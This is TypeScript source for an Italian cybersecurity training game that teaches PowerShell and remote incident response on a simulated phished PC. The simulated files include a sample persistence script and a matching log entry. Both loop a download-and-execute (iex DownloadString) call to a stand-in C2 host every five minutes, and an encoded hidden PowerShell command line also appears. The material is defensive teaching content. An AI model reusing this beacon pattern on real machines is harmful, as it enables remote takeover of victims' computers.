// Capitolo 12, missioni 4 e 5: PowerShell da analista.
// 12.4 PowerShell sul deck: oggetti invece di testo, la pipeline, filtrare e contare.
// 12.5 Risposta a distanza: con Enter-PSSession sul PC dell'amministrazione colpito dal
//      phishing del capitolo SOC: processi, connessioni, persistenza, account, eventi,
//      e il contenimento chiesto dal L2.

import { PS_COMPUTERS, type WinSystem } from '../engine/pwsh';
import type { ShellEvent } from '../engine/types';
import { Vfs } from '../engine/vfs';
import type { Mission } from '../game/types';
import { DOCM_CONTENT, DOCM_HASH } from './chSOC-turno';

const ps = (name: string, test: (args: string[]) => boolean = () => true) => (ev: ShellEvent) =>
  ev.type === 'command' && ev.name === `ps:${name}` && ev.ok && test(ev.args);

export const C2_IP = '198.51.100.200';

function pcAmm07(): WinSystem {
  const fs = new Vfs();
  const u = { owner: 'r.costa', group: 'r.costa' };
  for (const d of ['/Windows/System32/drivers/etc', '/Program Files/Microsoft Office', '/Users/Public', '/Users/ir-analista/Documents'])
    fs.mkdirp(d, { owner: 'SYSTEM', group: 'SYSTEM' });
  fs.writeFile('/Windows/System32/drivers/etc/hosts', '# file hosts di Windows\n127.0.0.1 localhost\n', { owner: 'SYSTEM', group: 'SYSTEM' });
  fs.writeFile('/Users/r.costa/Downloads/fattura_novembre.docm', DOCM_CONTENT, u);
  fs.writeFile('/Users/r.costa/Downloads/listino_2077.pdf', '%PDF-1.7 listino prezzi fornitori\n', u);
  fs.writeFile('/Users/r.costa/Documents/bilancio_q3.xlsx', 'PK foglio di calcolo del bilancio\n', u);
  fs.writeFile('/Users/r.costa/Desktop/promemoria.txt', 'Pagare fattura Kiroshi entro venerdì.\nChiamare la banca per il nuovo IBAN del fornitore.\n', u);
  fs.writeFile(
    '/Users/r.costa/AppData/Roaming/Microsoft/sync.ps1',
    [
      '# "sincronizzazione" (non è OneDrive)',
      '$c = New-Object Net.WebClient',
      'while ($true) {',
      "  try { iex $c.DownloadString('http://cdn-upd4te.nc:8443/b?id=7f3a') } catch {}",
      '  Start-Sleep -Seconds 300',
      '}',
    ].join('\n') + '\n',
    u,
  );
  return {
    hostname: 'PC-AMM-07',
    fs,
    users: ['ir-analista'],
    homeBase: '/Users',
    win: {
      processes: [
        { Name: 'System', Id: 4, CPU: 120.4, WS: 1, Path: '', Parent: '', CommandLine: '', Company: '' },
        { Name: 'smss', Id: 388, CPU: 0.1, WS: 1, Path: 'C:\\Windows\\System32\\smss.exe', Parent: 'System', CommandLine: '\\SystemRoot\\System32\\smss.exe', Company: 'Microsoft Corporation' },
        { Name: 'csrss', Id: 512, CPU: 3.2, WS: 6, Path: 'C:\\Windows\\System32\\csrss.exe', Parent: 'smss', CommandLine: '%SystemRoot%\\system32\\csrss.exe', Company: 'Microsoft Corporation' },
        { Name: 'services', Id: 640, CPU: 8.9, WS: 11, Path: 'C:\\Windows\\System32\\services.exe', Parent: 'wininit', CommandLine: 'C:\\Windows\\system32\\services.exe', Company: 'Microsoft Corporation' },
        { Name: 'lsass', Id: 652, CPU: 15.7, WS: 24, Path: 'C:\\Windows\\System32\\lsass.exe', Parent: 'wininit', CommandLine: 'C:\\Windows\\system32\\lsass.exe', Company: 'Microsoft Corporation' },
        { Name: 'svchost', Id: 788, CPU: 22.1, WS: 31, Path: 'C:\\Windows\\System32\\svchost.exe', Parent: 'services', CommandLine: 'svchost.exe -k DcomLaunch', Company: 'Microsoft Corporation' },
        { Name: 'svchost', Id: 1044, CPU: 9.4, WS: 18, Path: 'C:\\Windows\\System32\\svchost.exe', Parent: 'services', CommandLine: 'svchost.exe -k netsvcs', Company: 'Microsoft Corporation' },
        { Name: 'MsMpEng', Id: 2210, CPU: 64.3, WS: 210, Path: 'C:\\ProgramData\\Microsoft\\Windows Defender\\MsMpEng.exe', Parent: 'services', CommandLine: 'MsMpEng.exe', Company: 'Microsoft Corporation' },
        { Name: 'explorer', Id: 3120, CPU: 41.0, WS: 120, Path: 'C:\\Windows\\explorer.exe', Parent: 'userinit', CommandLine: 'C:\\Windows\\Explorer.EXE', Company: 'Microsoft Corporation' },
        { Name: 'OUTLOOK', Id: 4410, CPU: 55.6, WS: 180, Path: 'C:\\Program Files\\Microsoft Office\\OUTLOOK.EXE', Parent: 'explorer', CommandLine: '"OUTLOOK.EXE"', Company: 'Microsoft Corporation' },
        { Name: 'WINWORD', Id: 4502, CPU: 12.8, WS: 95, Path: 'C:\\Program Files\\Microsoft Office\\WINWORD.EXE', Parent: 'OUTLOOK', CommandLine: '"WINWORD.EXE" C:\\Users\\r.costa\\Downloads\\fattura_novembre.docm', Company: 'Microsoft Corporation' },
        { Name: 'powershell', Id: 4588, CPU: 312.5, WS: 88, Path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe', Parent: 'WINWORD', CommandLine: 'powershell.exe -nop -w hidden -enc JABjAD0ATgBlAHcA...', Company: 'Microsoft Corporation' },
        { Name: 'wsmprovhost', Id: 5120, CPU: 0.4, WS: 40, Path: 'C:\\Windows\\System32\\wsmprovhost.exe', Parent: 'svchost', CommandLine: 'wsmprovhost.exe -Embedding', Company: 'Microsoft Corporation' },
      ],
      services: [
        { Name: 'WinDefend', DisplayName: 'Microsoft Defender Antivirus Service', Status: 'Running', StartType: 'Automatic' },
        { Name: 'WinRM', DisplayName: 'Windows Remote Management (WS-Management)', Status: 'Running', StartType: 'Automatic' },
        { Name: 'wuauserv', DisplayName: 'Windows Update', Status: 'Running', StartType: 'Manual' },
        { Name: 'Spooler', DisplayName: 'Print Spooler', Status: 'Running', StartType: 'Automatic' },
        { Name: 'RemoteRegistry', DisplayName: 'Remote Registry', Status: 'Stopped', StartType: 'Disabled' },
        { Name: 'EventLog', DisplayName: 'Windows Event Log', Status: 'Running', StartType: 'Automatic' },
      ],
      tasks: [
        { TaskName: 'OneDrive Standalone Update Task', TaskPath: '\\', State: 'Ready', Author: 'Microsoft Corporation', Action: 'C:\\Program Files\\Microsoft OneDrive\\OneDriveStandaloneUpdater.exe', Trigger: 'ogni giorno alle 11:20' },
        { TaskName: 'MicrosoftEdgeUpdateTaskMachineCore', TaskPath: '\\', State: 'Ready', Author: 'Microsoft Corporation', Action: 'C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe /c', Trigger: 'all\'accesso' },
        { TaskName: 'ScheduledDefrag', TaskPath: '\\Microsoft\\Windows\\Defrag\\', State: 'Ready', Author: 'Microsoft Corporation', Action: '%windir%\\system32\\defrag.exe -c -h -o', Trigger: 'settimanale' },
        { TaskName: 'OneDriveSync', TaskPath: '\\', State: 'Ready', Author: 'PC-AMM-07\\r.costa', Action: 'powershell.exe -w hidden -File C:\\Users\\r.costa\\AppData\\Roaming\\Microsoft\\sync.ps1', Trigger: 'ogni 5 minuti' },
      ],
      conns: [
        { LocalAddress: '10.0.3.44', LocalPort: 49690, RemoteAddress: '10.0.0.10', RemotePort: 445, State: 'Established', OwningProcess: 4 },
        { LocalAddress: '10.0.3.44', LocalPort: 49701, RemoteAddress: '203.0.113.25', RemotePort: 443, State: 'Established', OwningProcess: 4410 },
        { LocalAddress: '10.0.3.44', LocalPort: 49712, RemoteAddress: C2_IP, RemotePort: 8443, State: 'Established', OwningProcess: 4588 },
        { LocalAddress: '10.0.3.44', LocalPort: 5985, RemoteAddress: '10.0.1.5', RemotePort: 50122, State: 'Established', OwningProcess: 5120 },
        { LocalAddress: '0.0.0.0', LocalPort: 135, RemoteAddress: '0.0.0.0', RemotePort: 0, State: 'Listen', OwningProcess: 788 },
        { LocalAddress: '0.0.0.0', LocalPort: 445, RemoteAddress: '0.0.0.0', RemotePort: 0, State: 'Listen', OwningProcess: 4 },
      ],
      users: [
        { Name: 'Administrator', Enabled: false, LastLogon: '', Description: 'Account predefinito per l\'amministrazione' },
        { Name: 'Guest', Enabled: false, LastLogon: '', Description: 'Account predefinito per gli ospiti' },
        { Name: 'r.costa', Enabled: true, LastLogon: '13/11/2077 09:00', Description: 'Rita Costa - Amministrazione' },
        { Name: 'supporto', Enabled: true, LastLogon: '13/11/2077 09:06', Description: 'Account di assistenza' },
        { Name: 'WDAGUtilityAccount', Enabled: false, LastLogon: '', Description: 'Account di sistema' },
      ],
      groups: {
        Administrators: [
          { ObjectClass: 'User', Name: 'PC-AMM-07\\Administrator', PrincipalSource: 'Local' },
          { ObjectClass: 'Group', Name: 'ARASAKA\\Domain Admins', PrincipalSource: 'ActiveDirectory' },
          { ObjectClass: 'User', Name: 'PC-AMM-07\\r.costa', PrincipalSource: 'Local' },
          { ObjectClass: 'User', Name: 'PC-AMM-07\\supporto', PrincipalSource: 'Local' },
        ],
        Users: [{ ObjectClass: 'Group', Name: 'NT AUTHORITY\\Authenticated Users', PrincipalSource: 'Unknown' }],
      },
      events: [
        { TimeCreated: '13/11/2077 08:59:40', Id: 4624, LevelDisplayName: 'Information', LogName: 'Security', Message: 'An account was successfully logged on. Account: r.costa  Logon Type: 2' },
        { TimeCreated: '13/11/2077 09:02:58', Id: 4688, LevelDisplayName: 'Information', LogName: 'Security', Message: 'A new process has been created. WINWORD.EXE fattura_novembre.docm (parent: OUTLOOK.EXE)' },
        { TimeCreated: '13/11/2077 09:03:01', Id: 4688, LevelDisplayName: 'Information', LogName: 'Security', Message: 'A new process has been created. powershell.exe -nop -w hidden -enc JABjAD0A... (parent: WINWORD.EXE)' },
        { TimeCreated: '13/11/2077 09:03:05', Id: 4698, LevelDisplayName: 'Information', LogName: 'Security', Message: 'A scheduled task was created. Task: \\OneDriveSync  By: r.costa' },
        { TimeCreated: '13/11/2077 09:04:10', Id: 4720, LevelDisplayName: 'Information', LogName: 'Security', Message: 'A user account was created. New account: supporto  By: r.costa' },
        { TimeCreated: '13/11/2077 09:04:11', Id: 4732, LevelDisplayName: 'Information', LogName: 'Security', Message: 'A member was added to a security-enabled local group. Member: supporto  Group: Administrators  By: r.costa' },
        { TimeCreated: '13/11/2077 09:06:30', Id: 4624, LevelDisplayName: 'Information', LogName: 'Security', Message: 'An account was successfully logged on. Account: supporto  Logon Type: 3  Source: 10.0.3.44' },
        { TimeCreated: '13/11/2077 10:41:02', Id: 4624, LevelDisplayName: 'Information', LogName: 'Security', Message: 'An account was successfully logged on. Account: ARASAKA\\ir-analista  Logon Type: 3  Source: 10.0.1.5' },
        { TimeCreated: '13/11/2077 09:03:09', Id: 4104, LevelDisplayName: 'Warning', LogName: 'Microsoft-Windows-PowerShell/Operational', Message: "Creating Scriptblock text: $c = New-Object Net.WebClient; iex $c.DownloadString('http://cdn-upd4te.nc:8443/b?id=7f3a')" },
      ],
    },
  };
}

PS_COMPUTERS['PC-AMM-07'] = pcAmm07;

// ------------------------------------------------------------------ 12.4

export const PWSH_MISSION: Mission = {
  id: 'ch12-m4',
  title: 'Oggetti, non testo',
  tagline: 'PowerShell vero: Verbo-Nome, la pipeline di oggetti, filtrare, ordinare, contare.',
  xp: 300,
  steps: [
    {
      kind: 'lesson',
      title: 'Un altro modo di pensare',
      body: `@nyx: Finora PowerShell l'hai visto travestito da Linux (\`Get-Content\` che fa da \`cat\`). Adesso lo usi davvero: nei SOC che sorvegliano aziende Windows è lo strumento di tutti i giorni.

La differenza con bash è una sola, ma cambia tutto:
- in **bash**, tra un comando e l'altro della pipeline passa **testo**: per prendere "la quinta colonna" usi cut o awk e speri che il formato non cambi
- in **PowerShell** passano **oggetti**: ogni elemento ha delle **proprietà** con un nome (\`Name\`, \`Length\`, \`Id\`...). Non tagli colonne: chiedi la proprietà.

I comandi si chiamano **cmdlet** e hanno sempre la forma **Verbo-Nome**: \`Get-Process\` (prendi i processi), \`Stop-Process\`, \`Get-ChildItem\`. Le maiuscole non contano. Molti hanno un alias corto: \`ls\`, \`cat\`, \`ps\`.

PowerShell esiste anche su Linux: si apre con \`pwsh\`, e si esce con \`exit\`.`,
    },
    {
      kind: 'task',
      title: 'Apri PowerShell',
      body: `\`\`\`
pwsh
\`\`\`

Il prompt cambia: inizia con \`PS\` e mostra la cartella in cui sei.`,
      objective: 'Apri la console PowerShell.',
      hints: ['Il comando è pwsh.', 'pwsh'],
      check: (ev) => ev.type === 'command' && ev.name === 'pwsh-start',
      success: 'Sei in PowerShell. I comandi di Linux continuano a funzionare (su Linux pwsh li trova), ma da qui in avanti usa i cmdlet.',
    },
    {
      kind: 'task',
      title: 'Gli oggetti',
      body: `\`\`\`
Get-ChildItem windows
\`\`\`

Sembra un \`ls -l\`. Ma ogni riga è un **oggetto** con le proprietà Mode, LastWriteTime, Length (la dimensione), Name. Per vederle tutte:

\`\`\`
Get-ChildItem windows | Format-List
\`\`\``,
      objective: 'Elenca il contenuto di windows con Get-ChildItem.',
      hints: ['Get-ChildItem seguito dal nome della cartella.', 'Get-ChildItem windows'],
      check: ps('get-childitem'),
      success: 'Con `Format-List` compaiono anche FullName e Directory: proprietà che l\'output a tabella non mostrava, ma che erano lì.',
    },
    {
      kind: 'lesson',
      title: 'La pipeline di oggetti',
      body: `I cmdlet per lavorare sugli oggetti sono pochi, e valgono per qualsiasi cosa (file, processi, eventi, utenti):

\`\`\`
Where-Object { $_.Length -gt 1000 }    # filtra: solo quelli con Length > 1000
Select-Object Name, Length             # tiene solo alcune proprietà
Select-Object -First 3                 # i primi tre
Sort-Object Length -Descending         # ordina, dal più grande
Group-Object Id                        # raggruppa e conta
Measure-Object                         # conta (Count)
\`\`\`

\`$_\` è "l'oggetto che sta passando". Gli operatori di confronto sono parole: \`-eq\` (uguale), \`-ne\` (diverso), \`-gt\` / \`-lt\` (maggiore / minore), \`-like\` (con l'asterisco: \`-like '*.log'\`), \`-match\` (espressione regolare).

\`Select-String\` è il grep di PowerShell: cerca un testo nelle righe.`,
    },
    {
      kind: 'task',
      title: 'Il più grande',
      body: `Trova il file \`.log\` più grande in tutta la tua home:

\`\`\`
Get-ChildItem -Recurse -Filter *.log | Sort-Object Length -Descending | Select-Object -First 1
\`\`\``,
      objective: 'Qual è il file .log più grande della home? Invia il nome con flag.',
      hints: ['-Recurse entra nelle sottocartelle, -Filter sceglie i nomi, poi ordini per Length.', 'flag auth.log (il primo della lista, colonna Name)'],
      answer: ['auth.log'],
      success: 'Nessun cut, nessun awk: hai ordinato per la proprietà Length per nome. Se domani il formato dell\'output cambia, il comando funziona ancora.',
    },
    {
      kind: 'task',
      title: 'Conta i fallimenti',
      body: `Le righe del registro eventi del capitolo 12.3 contengono l'Event ID: 4625 è "accesso non riuscito".

\`\`\`
Get-Content windows/security.csv | Select-String 4625 | Measure-Object
\`\`\``,
      objective: 'Quanti accessi falliti (4625)? Invia il numero (Count) con flag.',
      hints: ['La proprietà Count di Measure-Object.', 'flag 8'],
      answer: ['8'],
      success: 'Lo stesso risultato di `grep -c 4625`. Ma Measure-Object funziona su qualsiasi oggetto: processi, utenti, eventi.',
    },
    {
      kind: 'task',
      title: 'Il processo più pesante',
      body: `\`\`\`
Get-Process | Sort-Object WS -Descending | Select-Object -First 3
\`\`\`

\`WS\` (*Working Set*) è la memoria usata, in MB.`,
      objective: 'Quale processo usa più memoria? Invia il nome con flag.',
      hints: ['Il primo della lista ordinata per WS.', 'flag pwsh'],
      answer: ['pwsh'],
      success: 'È PowerShell stesso. Su Windows lo stesso comando è il primo controllo quando un PC "va lento": un miner o un processo impazzito saltano subito in cima.',
    },
    {
      kind: 'quiz',
      title: 'Verifica',
      ex: 'interpreta',
      skills: ['pwsh'],
      question: 'Cosa fa `Get-ChildItem -Recurse | Where-Object { $_.Length -gt 10MB } | Select-Object FullName, Length`?',
      options: [
        'Elenca, in tutte le sottocartelle, i file più grandi di 10 MB con percorso completo e dimensione',
        'Cancella i file più grandi di 10 MB',
        'Mostra i primi 10 file',
        'Conta quanti file ci sono',
      ],
      correct: 0,
      explain: 'Get- non modifica mai niente: i cmdlet che cambiano le cose hanno verbi come Set-, Remove-, Stop-, Disable-. È una buona regola anche per leggere gli script altrui.',
    },
    {
      kind: 'quiz',
      title: 'Verifica',
      skills: ['pwsh'],
      question: 'In bash conti le righe con `grep X file | wc -l`. Qual è l\'equivalente in PowerShell?',
      options: [
        'Get-Content file | Select-String X | Measure-Object',
        'Get-Content file | grep X | Count',
        'Select-Object X file -Count',
        'Measure-String X file',
      ],
      correct: 0,
      explain: 'Get-Content legge, Select-String filtra, Measure-Object conta. Stessa idea della pipeline di bash, con oggetti al posto del testo.',
    },
  ],
  recap: [
    ['pwsh', 'apre PowerShell (anche su Linux); exit per uscire'],
    ['Verbo-Nome', 'Get-, Set-, Stop-, Disable-...: il verbo dice cosa fa'],
    ['Get-ChildItem', 'file e cartelle (ls, dir); -Recurse, -Filter, -Force'],
    ['Where-Object { $_.P -eq V }', 'filtra gli oggetti'],
    ['Select-Object A,B / -First N', 'sceglie proprietà o elementi'],
    ['Sort-Object P -Descending', 'ordina'],
    ['Measure-Object', 'conta (Count), somma, media'],
    ['Select-String', 'il grep di PowerShell'],
    ['Format-List', 'mostra tutte le proprietà'],
  ],
};

// ------------------------------------------------------------------ 12.5

export const PSIR_MISSION: Mission = {
  id: 'ch12-m5',
  title: 'Risposta a distanza',
  tagline: 'Enter-PSSession sul PC colpito: processi, connessioni, persistenza, account, eventi, contenimento.',
  xp: 400,
  steps: [
    {
      kind: 'lesson',
      title: 'Il PC dell\'amministrazione',
      body: `@rook: Ti ricordi PC-AMM-07, il phishing con la macro del tuo primo turno al SOC? Hanako (L2) ha isolato il PC dalla rete, lasciando aperto solo il canale di gestione. Ti chiede di raccogliere le prove con PowerShell, da remoto, e poi di eseguire il contenimento.

@nyx: \`Enter-PSSession\` apre una console PowerShell **su un altro computer**, attraverso il servizio **WinRM** (Windows Remote Management, porta 5985). Tutto quello che scrivi gira là. È così che lavora un incident responder in un'azienda con mille PC: senza alzarsi dalla sedia.

!! Regola dell'incident response: prima **raccogli**, poi **contieni**. Spegnere o cancellare prima di guardare distrugge le prove.`,
    },
    {
      kind: 'task',
      title: 'Collegati',
      body: `Da PowerShell (\`pwsh\`, se non ci sei già):

\`\`\`
Enter-PSSession -ComputerName PC-AMM-07
\`\`\`

Il prompt diventa \`[PC-AMM-07]: PS C:\\Users\\...\`: sei sul PC remoto. I percorsi ora sono di Windows (\`C:\\Users\\...\`).`,
      objective: 'Apri una sessione remota su PC-AMM-07.',
      hints: ['Prima pwsh, poi Enter-PSSession con -ComputerName.', 'pwsh e poi Enter-PSSession -ComputerName PC-AMM-07'],
      check: ps('enter-pssession'),
      success: 'Sei dentro. Ogni comando che scrivi viene registrato anche sul PC remoto (evento 4624 di tipo 3 e log di PowerShell): l\'analista lascia tracce come tutti, ed è giusto così.',
    },
    {
      kind: 'task',
      title: 'Chi consuma la CPU?',
      body: `\`\`\`
Get-Process | Sort-Object CPU -Descending | Select-Object -First 5
\`\`\``,
      objective: 'Quale processo ha usato più CPU (escluso System)? Invia il nome con flag.',
      hints: ['Ordina per CPU e guarda in cima.', 'flag powershell'],
      answer: ['powershell', 'powershell.exe'],
      success: 'Un PowerShell che lavora da ore su un PC dell\'amministrazione non è normale. Guardiamolo da vicino.',
    },
    {
      kind: 'task',
      title: 'Da dove viene?',
      body: `\`Format-List *\` mostra **tutte** le proprietà, comprese quelle che la tabella nasconde:

\`\`\`
Get-Process -Name powershell | Format-List *
\`\`\``,
      objective: 'Quale processo ha avviato powershell (Parent)? Invia il nome con flag.',
      hints: ['La riga Parent.', 'flag WINWORD'],
      answer: ['WINWORD', 'winword.exe', 'word'],
      success: 'Word che avvia PowerShell nascosto con un comando codificato (`-enc`): la stessa catena che l\'EDR aveva mostrato. Ora hai anche il **PID**: 4588.',
    },
    {
      kind: 'task',
      title: 'Con chi parla?',
      body: `\`Get-NetTCPConnection\` è il netstat di PowerShell: mostra le connessioni e il **processo** che le possiede (\`OwningProcess\`, il PID).

\`\`\`
Get-NetTCPConnection -State Established
\`\`\``,
      objective: 'A quale IP remoto è collegato il processo 4588? Invialo con flag.',
      hints: ['La riga con OwningProcess 4588. Puoi anche filtrare: Get-NetTCPConnection -OwningProcess 4588', `flag ${C2_IP}`],
      answer: [C2_IP],
      success: `Porta 8443 verso \`${C2_IP}\`: è l'indirizzo dietro \`cdn-upd4te.nc\`, il server dell'attaccante (**C2**, *command and control*). Il proxy bloccava il nome; la connessione diretta all'IP è passata. Nuovo IOC per il ticket.`,
    },
    {
      kind: 'task',
      title: 'La persistenza',
      body: `Un malware vuole sopravvivere ai riavvii. Il posto più comune su Windows: le **attività pianificate**. Quelle di Windows hanno come autore Microsoft; le altre meritano un'occhiata:

\`\`\`
Get-ScheduledTask | Where-Object { $_.Author -ne 'Microsoft Corporation' }
\`\`\``,
      objective: 'Come si chiama l\'attività sospetta? Invia il nome con flag.',
      hints: ['L\'unica con un autore diverso da Microsoft.', 'flag OneDriveSync'],
      answer: ['OneDriveSync'],
      success: 'Un nome scelto per sembrare legittimo (esiste un vero aggiornamento di OneDrive, ma ha Microsoft come autore). È la tecnica **T1053** di MITRE ATT&CK: *Scheduled Task*.',
    },
    {
      kind: 'task',
      title: 'Cosa esegue?',
      body: `\`\`\`
Get-ScheduledTask -TaskName OneDriveSync | Format-List
\`\`\`

La proprietà \`Action\` dice quale script parte. Poi leggilo:

\`\`\`
Get-Content C:\\Users\\r.costa\\AppData\\Roaming\\Microsoft\\sync.ps1
\`\`\`

(\`AppData\` è una cartella nascosta: \`Get-ChildItem\` la mostra solo con \`-Force\`.)`,
      objective: 'Ogni quanti secondi lo script contatta il server? Invia il numero con flag.',
      hints: ['Start-Sleep -Seconds ...', 'flag 300'],
      answer: ['300'],
      success: '300 secondi, cioè 5 minuti: il **beaconing** che avevi visto nel proxy. `iex` (Invoke-Expression) esegue qualsiasi comando arrivi dal server: l\'attaccante può far fare al PC quello che vuole.',
    },
    {
      kind: 'task',
      title: 'Un amministratore in più',
      body: `\`\`\`
Get-LocalGroupMember -Group Administrators
\`\`\`

Gli amministratori locali dovrebbero essere pochi e conosciuti.`,
      objective: 'Quale account locale non dovrebbe essere amministratore? Invia il nome (senza PC-AMM-07\\) con flag.',
      hints: ['Administrator, Domain Admins e... chi altro? Confronta con Get-LocalUser.', 'flag supporto'],
      answer: ['supporto', 'PC-AMM-07\\supporto'],
      success: '`supporto`, "account di assistenza": un nome rassicurante per una **backdoor**. Nota anche che `r.costa` è amministratrice del suo PC: per questo la macro ha potuto creare account. Minimo privilegio: un utente dell\'amministrazione non dovrebbe esserlo.',
    },
    {
      kind: 'task',
      title: 'Quando è stato creato?',
      body: `Il Registro eventi lo dice. \`-FilterHashtable\` sceglie registro ed Event ID (4720 = account creato):

\`\`\`
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4720}
\`\`\``,
      objective: 'A che ora è stato creato l\'account? Invia ore e minuti (HH:MM) con flag.',
      hints: ['La colonna TimeCreated.', 'flag 09:04'],
      answer: ['09:04', '09:04:10', '9:04'],
      success: `Alle 09:04, un minuto dopo PowerShell. La **timeline** si completa:

\`\`\`
09:01  apertura di fattura_novembre.docm
09:03  powershell -enc (padre WINWORD), attività OneDriveSync
09:04  creato l'account supporto, aggiunto agli Administrators (4720, 4732)
09:06  primo accesso di supporto (4624 tipo 3)
\`\`\`

?? Prova anche \`Get-WinEvent -LogName Security | Group-Object Id\`: in un colpo vedi quanti eventi di ogni tipo ci sono.`,
    },
    {
      kind: 'task',
      title: 'L\'impronta del file',
      body: `Conferma che il documento sul PC è lo stesso che l'EDR aveva segnalato:

\`\`\`
Get-FileHash C:\\Users\\r.costa\\Downloads\\fattura_novembre.docm
\`\`\`

PowerShell scrive l'hash in maiuscolo, l'EDR in minuscolo: per un hash è la stessa cosa.`,
      objective: 'Invia con flag i primi 8 caratteri dell\'hash.',
      hints: ['La colonna Hash.', `flag ${DOCM_HASH.slice(0, 8).toUpperCase()}`],
      answer: [DOCM_HASH.slice(0, 8)],
      success: 'Corrisponde all\'IOC della nota di escalation. Ora il L2 può cercare lo stesso hash su tutti gli altri PC dell\'azienda.',
    },
    {
      kind: 'lesson',
      title: 'Contenere senza distruggere',
      body: `Le prove sono raccolte. Hanako ti chiede tre azioni di **contenimento**, scritte nel playbook:

\`\`\`
Disable-ScheduledTask -TaskName OneDriveSync   # disattiva (non cancella)
Stop-Process -Id 4588                          # ferma il beacon
Disable-LocalUser -Name supporto               # blocca la backdoor
\`\`\`

Nota i verbi: **Disable**, non *Remove*. L'attività e l'account restano lì, spenti: sono prove, e serviranno all'analisi forense e magari a una denuncia. La pulizia completa (o la reinstallazione del PC) viene dopo, decisa con l'incident response.`,
    },
    {
      kind: 'task',
      title: 'Spegni la persistenza',
      body: `\`\`\`
Disable-ScheduledTask -TaskName OneDriveSync
\`\`\``,
      objective: 'Disattiva l\'attività pianificata OneDriveSync.',
      hints: ['Disable-ScheduledTask con -TaskName.', 'Disable-ScheduledTask -TaskName OneDriveSync'],
      check: ps('disable-scheduledtask', (a) => a[0] === 'OneDriveSync'),
      success: 'State: Disabled. Al prossimo giro di 5 minuti non ripartirà.',
    },
    {
      kind: 'task',
      title: 'Ferma il beacon',
      body: `\`\`\`
Stop-Process -Id 4588
\`\`\``,
      objective: 'Termina il processo PowerShell malevolo (PID 4588).',
      hints: ['Stop-Process con -Id.', 'Stop-Process -Id 4588'],
      check: ps('stop-process', (a) => a[0] === '4588'),
      success: 'Processo terminato. Controlla con `Get-NetTCPConnection -State Established`: la connessione verso il C2 è sparita.',
    },
    {
      kind: 'task',
      title: 'Chiudi la porta di servizio',
      body: `\`\`\`
Disable-LocalUser -Name supporto
\`\`\`

Poi verifica con \`Get-LocalUser\` e chiudi la sessione con \`Exit-PSSession\`.`,
      objective: 'Disattiva l\'account supporto.',
      hints: ['Disable-LocalUser con -Name.', 'Disable-LocalUser -Name supporto'],
      check: ps('disable-localuser', (a) => a[0] === 'supporto'),
      success: `Enabled: False. Contenimento eseguito, e ogni azione è registrata con il tuo account e l'ora.

@rook: Hanako dice che hai fatto in venti minuti quello che a un junior di solito richiede una mattina. Si comincia a ragionare.`,
    },
    {
      kind: 'quiz',
      title: 'Verifica',
      skills: ['pwsh'],
      question: 'Perché Disable-ScheduledTask e non Unregister-ScheduledTask (che la cancella)?',
      options: [
        'Perché l\'attività è una prova: disattivata non fa danni, ma resta disponibile per l\'analisi',
        'Perché Unregister non esiste',
        'Perché disattivare è più veloce',
        'Perché cancellarla avvisa l\'attaccante',
      ],
      correct: 0,
      explain: 'Contenere senza distruggere: prima si ferma il danno, poi si analizza, poi si bonifica. Lo stesso vale per account, file e processi.',
    },
    {
      kind: 'quiz',
      title: 'Verifica',
      ex: 'interpreta',
      skills: ['pwsh'],
      question: 'Quale comando trova tutte le connessioni stabilite di un processo con PID 4588?',
      options: [
        'Get-NetTCPConnection -State Established | Where-Object { $_.OwningProcess -eq 4588 }',
        'Get-Process 4588 | netstat',
        'Get-NetTCPConnection | Select-String 4588',
        'Stop-Process -Id 4588 -Connections',
      ],
      correct: 0,
      explain: 'Filtri sulla proprietà OwningProcess. Select-String cercherebbe il testo "4588" ovunque (anche in una porta 45880): con gli oggetti si è precisi.',
    },
  ],
  recap: [
    ['Enter-PSSession -ComputerName PC', 'console PowerShell remota (WinRM, 5985)'],
    ['Exit-PSSession', 'chiude la sessione remota'],
    ['Get-Process | Format-List *', 'tutte le proprietà: Parent, Path, CommandLine'],
    ['Get-NetTCPConnection', 'connessioni e processo proprietario'],
    ['Get-ScheduledTask', 'attività pianificate: persistenza (T1053)'],
    ['Get-LocalGroupMember Administrators', 'chi è amministratore del PC'],
    ['Get-WinEvent -FilterHashtable', 'eventi per registro e Id'],
    ['Get-FileHash', 'impronta SHA256 di un file'],
    ['Disable-* / Stop-Process', 'contenere senza distruggere le prove'],
    ['C2', 'command and control: il server che comanda il malware'],
  ],
};
